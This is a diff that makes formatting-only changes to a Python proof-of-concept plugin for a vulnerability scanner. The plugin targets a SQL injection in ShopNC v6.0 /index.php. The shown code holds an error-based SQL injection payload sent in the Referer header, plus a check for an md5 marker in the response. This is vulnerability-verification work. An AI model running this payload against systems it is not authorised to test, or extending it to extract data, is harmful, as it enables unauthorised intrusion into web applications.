@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'ShopNC_0001' # 平台漏洞编号，留空
+    vuln_id = 'ShopNC_0001'  # 平台漏洞编号，留空
     name = 'ShopNC v6.0 /index.php SQL注入漏洞'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-01-31'  # 漏洞公布时间
     desc = '''
         ShopNC v6.0 /index.php文件存在SQL注入漏洞。
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'ShopNC'  # 漏洞应用名称
     product_version = 'v6.0'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '0efeb3f5-d514-4d7d-b259-7e32bae0c70d'
@@ -32,7 +34,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             header = {
                 'Referer': ''' ("http://baidu.com'and(select 1 from(select count(*),concat("
                                "floor(rand(0)*2),0x3a,(select(select(SELECT md5(233333)))"
@@ -44,14 +46,15 @@ class Poc(ABPoc):
             content = urllib2.urlopen(req).read()
 
             if 'fb0b32aeafac4591c7ae6d5e58308344' in content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
